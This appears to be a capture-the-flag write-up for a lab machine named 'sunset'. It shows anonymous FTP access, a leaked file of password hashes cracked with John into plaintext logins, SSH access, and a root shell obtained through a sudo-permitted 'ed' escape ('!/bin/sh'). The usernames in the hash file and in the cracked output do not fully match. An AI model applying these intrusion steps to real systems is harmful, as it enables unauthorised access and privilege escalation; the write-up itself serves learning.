## Nmap

Only two ports are open and since FTP allowed anonymous login so let's start with that.

***

## FTP

After logging into FTP with anonymous credentials I found a file named `backup`

That file contained the hashes of some of the passwords.

```
➜ cat backup
CREDENTIALS:
office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.

sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/
```

After removing the `CREDENTIAL` from the file I ran the file through john without any wordlist.

I got password for 3 user

```
sky:sky
sunset:cheer14
space:space
```

and was able to login into SSH via `sunset's` password.

And now we can get the `user` hash.

## Privilege escalation

I downloaded the enumeration script from my own system and then ran it to see if I can find anything interesting.

The enumeration script gave out nothing but I found out that user `sunset` had some sudo priveleges.

![](images/sunset/sudo.png)

We can run the `ed` binary as root.

I searched the `ed` binary on gtfobins and found [gtfobins/ed](https://gtfobins.github.io/gtfobins/ed/).

I was able to get the root shell with the following commnad:

```bash
$ sudo -u root ed
!/bin/sh
```
